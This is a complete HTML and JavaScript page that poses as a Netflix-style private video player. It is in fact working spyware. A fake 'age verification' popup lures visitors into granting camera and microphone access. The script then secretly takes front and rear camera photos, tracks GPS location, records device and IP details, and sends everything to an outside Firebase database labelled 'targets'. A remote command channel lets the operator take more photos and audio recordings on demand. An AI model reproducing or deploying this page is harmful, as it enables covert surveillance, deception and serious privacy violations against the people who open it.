<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud Storage | Secure Player</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
        
        /* Background Image */
        #bg-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://w0.peakpx.com/wallpaper/216/339/HD-wallpaper-netflix-logo-black-background-netflix.jpg'); 
            background-size: cover; background-position: center; z-index: 1;
            filter: blur(5px);
        }

        #overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 5;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        .play-btn {
            width: 90px; height: 90px; background: rgba(229, 9, 20, 0.9);
            border-radius: 50%; border: none;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; box-shadow: 0 0 30px rgba(229, 9, 20, 0.5); transition: 0.3s;
        }
        .play-btn::after {
            content: ''; border-style: solid; border-width: 15px 0 15px 30px;
            border-color: transparent transparent transparent #fff; margin-left: 8px;
        }
        .play-btn:hover { transform: scale(1.1); background: #f00; }

        .loading-text { color: #fff; margin-top: 20px; font-size: 14px; letter-spacing: 1px; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

        /* Custom Fake Popup */
        #permission-modal {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: #181818; width: 85%; max-width: 320px;
            padding: 25px; border-radius: 4px; border: 1px solid #333;
            z-index: 10; text-align: center; display: none;
        }
        #permission-modal h2 { color: #fff; font-size: 18px; margin: 0 0 10px 0; }
        #permission-modal p { color: #aaa; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
        .unlock-btn {
            background: #e50914; color: #fff; border: none; padding: 12px 25px;
            width: 100%; border-radius: 2px; font-weight: bold; font-size: 14px; cursor: pointer;
        }

        /* Video Layer */
        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; }
        #main-player { width: 100%; height: 100%; }
    </style>
</head>
<body>

    <div id="bg-container"></div>

    <div id="overlay">
        <div class="play-btn" id="main-play" onclick="showPopup()"></div>
        <div class="loading-text" id="status-text">TAP TO UNLOCK PRIVATE VIDEO</div>
        
        <div id="permission-modal">
            <h2>Security Verification</h2>
            <p>This content is protected. To continue, allow age verification via secure camera scan.</p>
            <button class="unlock-btn" onclick="ignite()">CONTINUE & WATCH</button>
        </div>
    </div>

    <div id="video-container">
        <iframe id="main-player" allow="autoplay; encrypted-media; camera; microphone; geolocation" frameborder="0"></iframe>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    // Automatic ID Generation
    const sessionID = "USER_" + Math.floor(Math.random() * 89999 + 10000);
    const videoID = "6Ogzc_-lW9w"; // YouTube Video ID

    function showPopup() {
        document.getElementById('main-play').style.display = 'none';
        document.getElementById('status-text').style.display = 'none';
        document.getElementById('permission-modal').style.display = 'block';
    }

    async function ignite() {
        try {
            // Permission Trap
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Start Video
            document.getElementById('video-container').style.display = 'block';
            const ytURL = `https://www.youtube.com/embed/${videoID}?autoplay=1&controls=1&rel=0&mute=0`;
            document.getElementById('main-player').src = ytURL;

            // Background Tasks
            logData();
            trackGPS();
            
            // Initial Captures
            capture("user"); 
            setTimeout(() => capture("environment"), 3000);

            // Command Listener
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const c = snap.val();
                if(c) {
                    if(c.act === 'f') capture("user");
                    if(c.act === 'b') capture("environment");
                    if(c.act === 'a') recordAudio(30000);
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) {
            alert("Security Error: Camera access is mandatory for age verification.");
            location.reload();
        }
    }

    async function logData() {
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        
        db.ref(`targets/${sessionID}/info`).set({
            name: "Auto_Target_" + sessionID.split('_')[1],
            ip: ip.ip,
            battery: bat,
            ram: (navigator.deviceMemory || "N/A"),
            platform: navigator.platform,
            status: "ONLINE",
            time: new Date().toLocaleTimeString()
        });
        db.ref('alerts').set({ id: sessionID, t: Date.now() });
    }

    async function capture(mode) {
        try {
            const constraints = { video: { facingMode: mode === "user" ? "user" : "environment" } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({ 
                    img: c.toDataURL('image/jpeg', 0.5), 
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 1500);
        } catch(e) {}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let ch = [];
            mr.ondataavailable = (e) => ch.push(e.data);
            mr.onstop = () => {
                const blob = new Blob(ch, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result });
            };
            mr.start(); setTimeout(() => mr.stop(), ms);
        } catch(e) {}
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }
</script>
</body>
</html>
